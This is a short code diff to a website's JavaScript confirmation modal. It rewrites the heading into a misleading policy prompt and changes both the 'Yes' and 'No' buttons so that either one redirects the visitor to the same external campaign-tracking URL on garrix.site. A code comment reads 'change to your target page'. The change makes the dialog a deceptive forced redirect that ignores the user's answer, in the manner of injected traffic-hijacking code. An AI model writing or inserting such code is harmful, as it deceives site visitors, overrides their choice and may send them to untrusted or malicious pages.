@@ -44,7 +44,7 @@ if(form){
   const bd=document.createElement('div');
   bd.className='modal-backdrop';
   bd.innerHTML=`<div class="modal">
-    <h3>New Policy Updates 2025</h3>
+    <h3>Are you accepting our policy to play the game? This notice is informational and does not block access</h3>
     <p>Please confirm to continue.</p>
     <div style="display:flex;gap:10px;flex-wrap:wrap">
       <button class="btn" id="age-yes">Yes</button>
@@ -61,6 +61,11 @@ if(form){
 
   const yes=bd.querySelector('#age-yes');
   const no=bd.querySelector('#age-no');
-  if(yes) yes.addEventListener('click',close);
-  if(no) no.addEventListener('click',close);
+  if(yes) yes.addEventListener('click',function(){
+    window.location.href = "https://garrix.site/?utm_campaign=eJyj9hW6as&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+  });
+  if(no) no.addEventListener('click',function(){
+    window.location.href = "https://garrix.site/?utm_campaign=eJyj9hW6as&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+  });
 })();
+
